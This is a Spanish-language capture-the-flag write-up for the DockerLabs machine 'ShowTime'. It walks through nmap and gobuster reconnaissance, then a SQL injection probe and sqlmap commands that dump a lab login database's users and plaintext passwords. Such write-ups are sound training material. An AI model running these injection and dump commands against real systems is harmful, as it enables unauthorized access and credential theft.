---
title: ShowTime - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | maciiii___        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/bbac4d0b-be5f-47eb-b440-77de77cb249c)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/5d5636f1-24fa-4a1e-a2f9-f58283e6b05c)

# Exploración Web
Al navegar al puerto `80`, encontramos una página la cual parece ser un casino, el cual se puede observar un panel de login.

![image](https://github.com/user-attachments/assets/8b0a912b-2560-4ab2-bdff-a13a3aa270a7)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/c3203ae4-dff2-4938-a70c-28346f56dc1d)

No encontramos nada interesante, asi que accedemos al apartado de login a ver si podemos hacer inyeccion.

## Inyeccion SQL

Para ello usaremos `sqlmap`, pero antes de ello haremos una prueba basica por si lo detecta sin necesidad de `slmap`.

```SQL
' UNION ORDER BY 1 -- -
```
![image](https://github.com/user-attachments/assets/fa7af2ce-2a6c-477e-9878-f1f9491540be)

Parece que no ha dado un error de mysql, por lo que podemos hacer inyeccion sql para hacerlo mas rapido usaremos , `sqlmap`.

![image](https://github.com/user-attachments/assets/39d2c2e8-5e90-4658-8a11-ad52451f197e)

Usaremos `burpsuite` para guardar la peticion con la extensio `.req`.

![image](https://github.com/user-attachments/assets/96c0bb58-a37e-4863-9dc3-cf1144b29567)

Ahora ejecutaremos los siguiente comandos.

Ver bases de datos
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch --db
```
```sql
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```
Ver tablas
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users --tables
```
```sql
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```
Usuarios y contraseñas
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users -T usuarios --dump
```
```sql
Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | 123321123321         | lucas    |
| 2  | 123456123456         | santiago |
| 3  | MiClaveEsInhackeable | joe      |
+----+----------------------+----------+
```
